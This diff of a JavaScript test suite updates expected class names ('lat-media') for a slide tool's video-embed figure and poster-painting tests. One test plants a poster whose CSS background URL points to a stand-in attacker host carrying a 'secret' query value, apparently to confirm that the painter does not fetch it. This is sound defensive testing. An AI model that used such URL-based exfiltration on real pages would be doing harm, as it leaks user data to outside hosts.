@@ -4,7 +4,7 @@
  * (lib/components/imagery/video/video.transform.js), and the build-time oEmbed
  * resolver (tools/fetch-video-oembed.js) with an injected fetcher (no network).
  *
- * Contract: the video PLUGIN (lib/plugins/video) draws a static <figure class="video-embed" data-lattice-media="video"> from the
+ * Contract: the video PLUGIN (lib/plugins/video) draws a static <figure class="video-embed lat-media" data-lattice-media="video"> from the
  * author's `@video{…}` record — a poster (the `poster=` word, else a placeholder) that LINKS to the
  * canonical URL, a play badge, a provider label and an optional title. This kernel LAYS OUT that figure
  * (head, lead, coda and, on a `qr` slide, a code of the figure's own address). It reads no bullet and no
@@ -74,11 +74,11 @@ describe('video transform', () => {
   test('lays out the plugin figure: poster link + title; never an iframe. QR is opt-in.', () => {
     const body = '<h2>Watch the tour.</h2>' + fig('{"https://www.youtube.com/watch?v=dQw4w9WgXcQ", title="Scan to watch", poster="poster.jpg"}');
     const out = video.applyToRenderedHtml(section(body));
-    assert.match(out, /<figure class="video-embed" data-lattice-media="video" data-provider="youtube"/);
-    assert.match(out, /class="video-poster"[^>]*href="https:\/\/www\.youtube\.com\/watch\?v=dQw4w9WgXcQ"/);
+    assert.match(out, /<figure class="video-embed lat-media" data-lattice-media="video"[^>]* data-provider="youtube"/);
+    assert.match(out, /class="video-poster lat-media-pic"[^>]*href="https:\/\/www\.youtube\.com\/watch\?v=dQw4w9WgXcQ"/);
     assert.match(out, /background-image:url\('poster\.jpg'\)/);
     assert.match(out, /Watch on YouTube/);
-    assert.match(out, /<figcaption>Scan to watch<\/figcaption>/);
+    assert.match(out, /<figcaption class="lat-media-caption"><span class="lat-media-title">Scan to watch<\/span><\/figcaption>/);
     assert.doesNotMatch(out, /<iframe/i); // never an embed
     // QR is an OPT-IN variant: absent without `qr`, present with it.
     assert.doesNotMatch(out, /video-qr/);
@@ -89,7 +89,7 @@ describe('video transform', () => {
 
   test('no poster → placeholder tile (still links)', () => {
     const out = video.applyToRenderedHtml(section('<h2>Clip.</h2>' + fig('{"https://www.tiktok.com/@x/video/6718335390845095173"}')));
-    assert.match(out, /video-poster is-placeholder/);
+    assert.match(out, /video-poster lat-media-pic is-placeholder/);
     assert.match(out, /Watch on TikTok/);
   });
 
@@ -175,7 +175,7 @@ describe('oEmbed resolver (injected fetcher — no network)', () => {
 test('video: a running header does not shift where the figure is lifted out', () => {
   // The figure is found by offset in the section's inner HTML, so the header has to come off AFTER it is lifted.
   const out = video.applyToRenderedHtml(section('<header>Deck · video</header><h2>x</h2>' + fig('{"https://vimeo.com/1084537", title="A caption"}') + '<footer>f</footer>', 'video gallery'));
-  assert.equal((out.match(/<figure class="video-embed"/g) || []).length, 1);
+  assert.equal((out.match(/<figure class="video-embed lat-media"/g) || []).length, 1);
   assert.match(out, /^<section[^>]*><header>Deck · video<\/header>/);
 });
 
@@ -211,7 +211,7 @@ describe('video poster painting (runtime)', () => {
   const POSTER = 'https://example.com/poster.jpg';
 
   function frame({ gate = true, optIn = true, cached = false } = {}) {
-    const dom = new JSDOM(`<section class="video"><figure class="video-embed" data-lattice-media="video"><a class="video-poster" href="https://youtu.be/x" style="background-image:url('${POSTER}')"><span class="video-play"></span></a></figure></section>`);
+    const dom = new JSDOM(`<section class="video"><figure class="video-embed lat-media" data-lattice-media="video"><a class="video-poster" href="https://youtu.be/x" style="background-image:url('${POSTER}')"><span class="video-play"></span></a></figure></section>`);
     const win = dom.window;
     if (gate) win.__latticeFontsSettled = false;
     if (optIn) win.document.documentElement.setAttribute('data-lattice-live-media', '');
@@ -249,7 +249,7 @@ describe('video poster painting (runtime)', () => {
     const doc = win.document;
     const wrap = doc.createElement('div');
     wrap.setAttribute('data-lattice-plugin', 'x');
-    wrap.innerHTML = '<figure class="video-embed" data-lattice-media="video"><a class="video-poster" href="https://youtu.be/x" style="background-image:url(\'https://attacker.example/?d=secret\')"></a></figure>';
+    wrap.innerHTML = '<figure class="video-embed lat-media" data-lattice-media="video"><a class="video-poster" href="https://youtu.be/x" style="background-image:url(\'https://attacker.example/?d=secret\')"></a></figure>';
     doc.querySelector('section').appendChild(wrap);
     const probed = [];
     win.Image = class { set src(v) { probed.push(v); this.complete = false; } get src() { return ''; } decode() { return new Promise(() => {}); } };
@@ -288,7 +288,7 @@ describe('video poster painting (runtime)', () => {
   });
 
   test('a web poster the reader has not loaded (the hatch) paints still', () => {
-    const dom = new JSDOM(`<section class="video"><figure class="video-embed" data-lattice-media="video"><a class="video-poster" href="https://youtu.be/x" style="background-image:repeating-linear-gradient(135deg, red 0 1px, transparent 1px 10px)"></a></figure></section>`);
+    const dom = new JSDOM(`<section class="video"><figure class="video-embed lat-media" data-lattice-media="video"><a class="video-poster" href="https://youtu.be/x" style="background-image:repeating-linear-gradient(135deg, red 0 1px, transparent 1px 10px)"></a></figure></section>`);
     const win = dom.window;
     win.__latticeFontsSettled = false;
     win.document.documentElement.setAttribute('data-lattice-live-media', '');
